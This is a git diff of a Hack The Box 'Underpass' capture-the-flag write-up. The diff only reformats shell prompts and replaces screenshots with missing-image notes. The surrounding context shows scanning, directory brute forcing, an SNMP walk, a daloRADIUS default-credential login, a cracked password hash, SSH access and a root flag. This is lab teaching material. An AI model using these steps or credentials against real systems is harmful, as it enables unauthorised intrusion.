@@ -5,8 +5,8 @@ Difficulty: Easy
 ## Steps
 ### Recon
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lvhikyluud][~]
- []$ nmap -Pn -T5 --min-rate=1000 --open -sV underpass.htb 
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
+└──╼ [★]$ nmap -Pn -T5 --min-rate=1000 --open -sV underpass.htb 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 18:18 CST
 Nmap scan report for underpass.htb (10.10.11.48)
 Host is up (0.067s latency).
@@ -19,14 +19,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
 ```
-[screenshot]\
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/018e938a-87b9-44db-a2c6-b9738578513c) returned 404 during the image audit (2026-10-08).
+
+
 We can see that Apache is running.
 
 ### Exploit-Search
 There is default apache running, so I will need to see if that version has any specific exploits.
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lvhikyluud][~]
- []$ searchsploit apache
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
+└──╼ [★]$ searchsploit apache
 ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                                                                      |  Path
 ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -322,8 +326,8 @@ Shellcodes: No Results
 ```
 We are running version *2.4.52*, so *apache2* may be better:
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lvhikyluud][~]
- []$ searchsploit apache2
+─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
+└──╼ [★]$ searchsploit apache2
 ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                                                                      |  Path
 ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -342,8 +346,8 @@ nuclei ut # update templates
 ```
 Now to run it on our target
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lvhikyluud][~]
- []$ nuclei -u http://underpass.htb
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
+└──╼ [★]$ nuclei -u http://underpass.htb
 
                      __     _
    ____  __  _______/ /__  (_)
@@ -385,8 +389,8 @@ Now to run it on our target
 ---
 ### Prodding
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lvhikyluud][~]
- []$ curl -I http://underpass.htb/
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
+└──╼ [★]$ curl -I http://underpass.htb/
 HTTP/1.1 200 OK
 Date: Fri, 03 Jan 2025 00:35:36 GMT
 Server: Apache/2.4.52 (Ubuntu)
@@ -398,15 +402,15 @@ Vary: Accept-Encoding
 Content-Type: text/html
 ```
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lvhikyluud][~]
- []$ curl -X OPTIONS http://underpass.htb/
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
+└──╼ [★]$ curl -X OPTIONS http://underpass.htb/
 ```
 
 ---
 ### Enumeration
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lvhikyluud][~]
- []$ gobuster vhost -u http://underpass.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
+└──╼ [★]$ gobuster vhost -u http://underpass.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -632,8 +636,8 @@ Finished
 All of them are 400 and tells us that there are likely no subdomains.
 
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lvhikyluud][~/smuggler]
- []$ python3 smuggler.py -u http://underpass.htb
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~/smuggler]
+└──╼ [★]$ python3 smuggler.py -u http://underpass.htb
 
   ______                         _              
  / _____)                       | |             
@@ -793,8 +797,8 @@ All of them are 400 and tells us that there are likely no subdomains.
 I gave up trying to get a smuggle working and so I looked into thise [guide](https://thecybersecguru.com/ctf-walkthroughs/mastering-underpass-beginners-guide-from-hackthebox/).\
 They tell me that their are open UDP ports to look into, so I tried:
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-efkagecyrh][~]
- []$ nmap -T5 --open -sS -sU -p- --min-rate=1500 underpass.htb -oN nmap-scan.txt
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-efkagecyrh]─[~]
+└──╼ [★]$ nmap -T5 --open -sS -sU -p- --min-rate=1500 underpass.htb -oN nmap-scan.txt
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-04 19:38 CST
 Warning: 10.10.11.48 giving up on port because retransmission cap hit (2).
 Nmap scan report for underpass.htb (10.10.11.48)
@@ -814,8 +818,8 @@ Nmap done: 1 IP address (1 host up) scanned in 149.83 seconds
 ### SNMP Walk
 Time to get started on looking into it:
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-efkagecyrh][~]
- []$ snmpwalk -v 2c -c public underpass.htb
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-efkagecyrh]─[~]
+└──╼ [★]$ snmpwalk -v 2c -c public underpass.htb
 iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
 iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
 iso.3.6.1.2.1.1.3.0 = Timeticks: (7868276) 21:51:22.76
@@ -873,8 +877,8 @@ steve@underpass.htb
 ### FFUF
 We want to do directory enumeration a bit differently this time:
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-9wmeajydlw][~]
- []$ ffuf -u "http://underpass.htb/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -e .php,.html,.js,.zip,.asp,.bak,.old
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-9wmeajydlw]─[~]
+└──╼ [★]$ ffuf -u "http://underpass.htb/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -e .php,.html,.js,.zip,.asp,.bak,.old
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -1017,8 +1021,8 @@ According to the guide, I am supposed to find /app/operators/login.php hmmm
 >> I needed to go from this line in the smbwalk output: **iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only *daloradius* server in the basin!"**
 
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-9wmeajydlw][~]
- []$ ffuf -u "http://underpass.htb/daloradius/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt  -e .php,.html,.js,.zip,.asp,.bak,.old
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-9wmeajydlw]─[~]
+└──╼ [★]$ ffuf -u "http://underpass.htb/daloradius/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt  -e .php,.html,.js,.zip,.asp,.bak,.old
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -1076,11 +1080,15 @@ setup                   [Status: 301, Size: 325, Words: 20, Lines: 10, Duration:
 :: Progress: [37784/37784] :: Job [1/1] :: 602 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
 ```
 Now we see *app*!\
-[screenshot]\
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/2ef4b34a-bdf2-4f40-8839-f99d4417cfe4) returned 404 during the image audit (2026-10-08).
+
+
 Huzzah! That's not a 404 we're looking at, so we are on the right track.
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-9wmeajydlw][~]
- []$ ffuf -u "http://underpass.htb/daloradius/app/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt  -e .php,.html,.js,.zip,.asp,.bak,.old
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-9wmeajydlw]─[~]
+└──╼ [★]$ ffuf -u "http://underpass.htb/daloradius/app/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt  -e .php,.html,.js,.zip,.asp,.bak,.old
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -1132,12 +1140,21 @@ users                   [Status: 301, Size: 329, Words: 20, Lines: 10, Duration:
 :: Progress: [37784/37784] :: Job [1/1] :: 598 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
 ```
 mmm...we aren'ts seen operators with this wordlist...so before I cheat and try another one that i know has it, let me see what these resolve to.\
-[screenshot]\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/93ce8dba-6bbb-4c64-98f1-d231893db818) returned 404 during the image audit (2026-10-08).
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/5396927d-f86b-4715-ac78-998e4cec3d5f) returned 404 during the image audit (2026-10-08).
+
+
 > Hey-o! *users* does have a login!
 >> But that's for client-side...we still want the admin
 
-[screenshot]\
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/a46154f7-1818-4ddd-a833-1a12b31b5f62) returned 404 during the image audit (2026-10-08).
+
+
 I am just going to go ahead and go to it without doing the search so I can continue.
 
 ---
@@ -1151,19 +1168,32 @@ The default credentials are:
 administrator:radius
 ```
 Let's try them out:\
-[screenshot]\
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/7e6ac779-3e09-4499-af83-3b6a72b08f14) returned 404 during the image audit (2026-10-08).
+
+
 That's kind of weird...maybe it is broken or I should try something else like the SSH first.
 
 > CONFIRMED BROKEN:
 
 The page should have taken me here according to the guide:\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/f73ea259-87e9-4956-bc7d-6730f02b1a18) returned 404 during the image audit (2026-10-08).
+
 
 > Got it after a reset!\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/07c0da56-7603-49a1-a5bd-55d3097ad8e3) returned 404 during the image audit (2026-10-08).
+
 
 We found a user:\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/dcba0b9f-28d2-45cf-90a7-3441b31621b9) returned 404 during the image audit (2026-10-08).
+
 
 ```Bash
 svcMosh:412DD4759978ACFCC81DEAB01B382403
@@ -1178,8 +1208,8 @@ svcMosh:underwaterfriends
 ### User svcMosh
 We gained access!
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-9wmeajydlw][~]
- []$ ssh svcMosh@underpass.htb 
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-9wmeajydlw]─[~]
+└──╼ [★]$ ssh svcMosh@underpass.htb 
 The authenticity of host 'underpass.htb (10.10.11.48)' can't be established.
 ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
 This key is not known by any other names.
@@ -1300,9 +1330,5 @@ root@underpass:~# cat root.txt
 ```
 > Got root access and the flag!
 >> ***44c13587615c8d2ad75ffa5b119460fb***
-
-
-
-
 
 
